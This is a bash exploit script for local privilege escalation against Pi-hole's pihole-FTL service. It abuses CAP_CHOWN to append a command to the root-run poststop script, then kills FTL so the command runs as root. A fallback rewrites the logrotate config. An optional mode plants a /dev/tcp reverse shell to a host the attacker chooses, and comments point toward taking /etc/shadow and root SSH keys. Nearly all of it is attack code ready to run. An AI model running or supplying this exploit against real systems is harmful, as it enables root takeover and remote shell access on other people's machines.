#!/bin/bash
set -eu

ROOTCMD='{ hostname;uptime;id;grep ^Cap /proc/self/status;pihole version; } >> /tmp/root-exec'

use_chpwn() {
  echo "[*] looking for ideal chown target"
  # using gnuchown if it exists, new rust coreutils tries to cd to the dir first, annoying depending on your target
  chown="$( command -v gnuchown || command -v chown )"

  # pihole-FTL runs with systemd ProtectSystem=full
  # otherwise we would take ownership of /etc/sudoers.d/
  poststop="/opt/pihole/pihole-FTL-poststop.sh"
  if [[ -d "/opt/pihole" ]] && [[ -f "${poststop}" ]];then
    # we should confirm /opt is rw (protectsystem=full, not strict, in case they change it)
    echo "[*] taking ownership"
    ${chown} pihole:pihole "${poststop}"
    echo "[*] adding cmd to pihole-FTL-poststop.sh"
    # echo "{ id; grep ^Cap /proc/self/status; } > /tmp/root-stop-exec.log" >> "${poststop}"
    echo "${ROOTCMD}" >> "${poststop}"
    ${chown} root:root "${poststop}"
    echo "[+] privesc-success, killing FTL so systemd run our script as root"
    echo "[*] FTL will restart in a few seconds, backgrounding so we can return here"
    if [ "${1:-}" == "rshell" ];then
      echo "[*] shell should connect back to ${2:-}:${3:-} soon"
    fi
    # could try to find a clean restart so it flushes http output, not important though
    sleep 3;pkill -9 pihole-FTL
  fi

  # not needed anymore, direct poststop/prestart is instant and less flaky
  # sometimes cron doesnt reload the root crontab, have to touch the mtime on dir
  # ${chown} pihole:pihole /var/spool/cron/crontabs
  # ${chown} pihole:pihole /var/spool/cron/crontabs/root 2>/dev/null || true
  # echo "* * * * * ${ROOTCMD}" >> /var/spool/cron/crontabs/root
  # chmod 600 /var/spool/cron/crontabs/root
  # ${chown} root:crontab /var/spool/cron/crontabs/root
  # ${chown} root:crontab /var/spool/cron/crontabs
  # echo "[+] root crontab staged. command will run within 60 seconds"
}

use_logrotate() {
  echo "[*] no CAP_CHOWN, trying to write pihole logrotate"
  mv -f /etc/pihole/logrotate /etc/pihole/logrotate.save 2>/dev/null || true
  cat > /etc/pihole/logrotate <<EOF
/var/log/pihole/pihole.log {
    daily
    rotate 1
    postrotate
        ${ROOTCMD}
    endscript
}
EOF
  chmod 600 /etc/pihole/logrotate
  echo "[+] logrotate staged. killing pihole to trigger pihole-FTL restart to change ownership, wait for midnight for logrotate cron job"
  pkill -9 pihole-FTL
}

if [ "${1:-}" == "rshell" ];then
  # rshell $rshell_ip $rshell_port
  ROOTCMD="/usr/bin/flock -n /tmp/linnemanlabs-shell.lock /bin/bash -c 'exec 3<>/dev/tcp/${2:-}/${3:-} || exit 1; exec /usr/bin/script -qfc \"/bin/bash -i\" /dev/null <&3 >&3 2>&3' >/dev/null 2>&1"
fi

echo "[*] Checking for privilege escalation opportunities"
havecaps=no
while read -r name value rest; do
    [ "$name" = "CapEff:" ] || continue
    case $value in *[13579bBdDfF]) havecaps="yes";; esac
    break
done < /proc/self/status

# should probably just check pihole versions and confirm conditions and make these functions for cleaner fallback calling etc
if [ "${havecaps}" = "yes" ];then
  # use the cap_chown path
  echo "[*] we have cap_chown, escalating"
  use_chpwn
  exit 0
else
  echo "[*] no cap_chown, trying other techniques"
fi

# confirm logrotate actually uses /etc/pihole/logrotate regardless if it exists or not, upgrades keep stale version around unused
# no point, cap_chown covers all versions that are vuln to this, use_presymlink is only one that works on 6.7.1 that patched cap_chown
# use_logrotate

# no direct root-exec, could run the prestart symlink attack and try to
# read /etc/shadow and try to crack passes, or root id_rsa etc

echo "[*] done"
exit 0
